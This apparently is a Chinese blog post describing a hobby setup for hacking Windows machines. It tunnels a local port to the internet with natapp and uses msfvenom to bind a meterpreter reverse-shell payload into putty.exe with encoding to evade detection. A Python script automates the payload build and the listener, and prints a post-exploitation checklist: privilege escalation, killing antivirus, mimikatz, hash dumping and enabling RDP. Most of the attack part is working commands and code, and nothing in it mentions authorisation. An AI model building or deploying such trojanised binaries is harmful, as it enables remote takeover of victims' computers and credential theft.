**自己在无聊捣鼓windows渗透的时候想到以往都是基于内网渗透，想要更加自由地进行渗透就需要内网穿透实现可以任意控制网段主机，同时也将端口转发作为自己的跳板。集成的脚本是考虑到在渗透的时候需要开启的工具繁多，所以尽可能能够一键开启工具，并且半自动化部署，可以优化前期的准备。**  

本文分成三个模块

> 利用natapp进行内网穿透；
>
> 利用msfvenom生成后门渗透；
>
> 半自动化脚本进行优化。

## 利用natapp进行内网穿透

首先需要下载一个工具用于内网穿透(<https://natapp.cn/>)，内网穿透主要是利用远程服务器将tcp连接转发到自己的电脑上。这样子就可以实现不同网段内计算机进行tcp连接。

我使用natapp工具进行内网穿透，注册并且免费获得自己的隧道。

本地地址填写127.0.0.1表示本机。

本地端口可以填写空闲端口。

authtoken用于开启natapp服务的code。

下载对应版本的natapp工具后，在命令行输入./natapp authtoken=xxxxxx。

打开后就可以看到自己的转发地址和端口，例如为server.natappfree.cc:38100。

这时候就完成了端口转发，保持服务开启即可。

## 利用msfvenom生成后门渗透

需要将自己的payload与任意exe文件进行捆绑，当目标点击使用我们捆绑后的exe后门就会自动反弹shell。

采用windows/meterpreter/reverse_tcp ，这是一个常用的windows tcp反弹payload。

比较常用的exe软件例如浏览器，ssh等其他用户长期开启软件，示例中用putty.exe为示范。

### 在终端输入如下命令：

    
    
    msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=127.0.0.1 lport=8998 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o puttyX.exe  
    

> -a 表示目标机器架构；
>
> -platform 表示系统平台；
>
> -x 表示捆绑软件；
>
> -p表示paylaod。

lhost和lport 输入之前内网穿透的ip和port。

> -i 表示编码次数，编码次数越多被检测的风险越大；
>
> -o 表示输出文件的位置和名字。

其他参数可以使用msfvenom –h 查看相应参数。

当目标打开puttyX.exe后我们在msfconsole上会监听到，就完成了前期的渗透。

## 半自动化脚本进行优化

由于msfvenom在每次生成文件都需要指定一系列参数，以及natapp还需要打开，最终还要打开msf进行反弹shell的监听，我尝试将三者结合在一起。就编写了一个简单的半自动化脚本，只需要输入要捆绑软件的位置，natapp转发的端口，编码次数，就可以直接生成payload文件，并且自动打开端口转发和打开msfconsole控制台。只能说是简单地集成下。

### 以下是文件的目录：

![基于 metasploit
内网穿透渗透测试](https://image.3001.net/images/20180302/15199785183389.png!small)  

natapp.sh和msfconsole.sh写了一句话命令用于打开natapp和msfconsole。

### startAttack.py文件主要代码如下：

    
    
      import os
        import webbrowser
        
        while True:
            #banner
            print('''
            This Script is for attacking prepare
            --------------------------------------------------------------------------            ___________              ___ ___                __                        
            \_   _____/__________   /   |   \_____    ____ |  | __ ___________  ______
             |    __)/  _ \_  __ \ /    ~    \__  \ _/ ___\|  |/ // __ \_  __ \/  ___/
             |     \(  <_> )  | \/ \    Y    // __ \\  \___|    <\  ___/|  | \/\___ \ 
             \___  / \____/|__|     \___|_  /(____  /\___  >__|_ \\___  >__|  /____  >
                 \/                       \/      \/     \/     \/    \/           \/ 
            --------------------------------------------------------------------------            ''')
        
            #Open new terminal :natapp
            print"[+]Open NAT service"
            os.system('open -a Terminal.app natapp.sh')
        
        
            #Generate Payload
            source_path=raw_input('Program path:').strip()
            host='server.natappfree.cc'#raw_input('IP:').strip()
            port=raw_input('PORT:').strip()
            code_time=raw_input('Code Times(3):').strip()
            if len(source_path)!=0 and len(port)!=0 and len(port)!=0:
                if len(code_time)==0:
                    code_time='3'
        
            print(
                '''
            ***************************************
                Source_path:%s\n
                IP:%s\n
                PORT:%s\n
                Code Times:%s\n
                '''
            )%(source_path,host,port,code_time)
        
            #confirm info
            flag=raw_input('(Y/N) ').strip()
            if flag=='Y' or flag=='y':
                print'''
                [+]Start Prepare attack. Open all tools. 3.2.1....
                '''
                cmd_line='msfvenom -a x86 --platform windows -x %s -k -p windows/meterpreter/reverse_tcp lhost=%s lport=%s -e x86/shikata_ga_nai -i %s -b "\\x00" -f exe -o /Users/steven/Desktop/X.exe'%(source_path,host,port,code_time)
                # output = os.popen(cmd_line, 'r')
                # print output.read()
                os.system(cmd_line)
        
                #Open new terminal :Msfconsole
                os.system('open -a Terminal.app msfconsole.sh')
        
                print'''
            ***************************************
                Open msfconsole....
                Open browser.Url:http://www.objectif-securite.ch/en/ophcrack.php
                
                1.getuid\getsystem
                2.background
                3.use exploit/windows/local/ask
                  set session 1
                  exploit
                (i.run killav)
                4.load mimikatz(msv / kerberos / wdigest / livessp)
                5.run post/windows/gather/smart_hashdump
                6.run post/windows/manage/enable_rdp
                
                '''
                # webbrowser.open("http://www.objectif-securite.ch/en/ophcrack.php")
                # webbrowser.open("https://www.jianshu.com/p/6535203977c4")
                # webbrowser.open("https://natapp.cn")
    
                break
            else:
                continue

### 效果如下：

![基于 metasploit
内网穿透渗透测试](https://image.3001.net/images/20180302/15199785048057.png!small)

这次渗透只是采用了非常传统的payload进行测试，集成脚本也没有优化都是随手撸出来一个。在脚本上肯定还有优化的地方和潜力，payload也可以多添加进行选择。以上都在日常无聊把玩中顺手弄的，如有不足还要多多指教。  

***本文作者：网络安全通，转载请注明来自 FreeBuf.COM。**

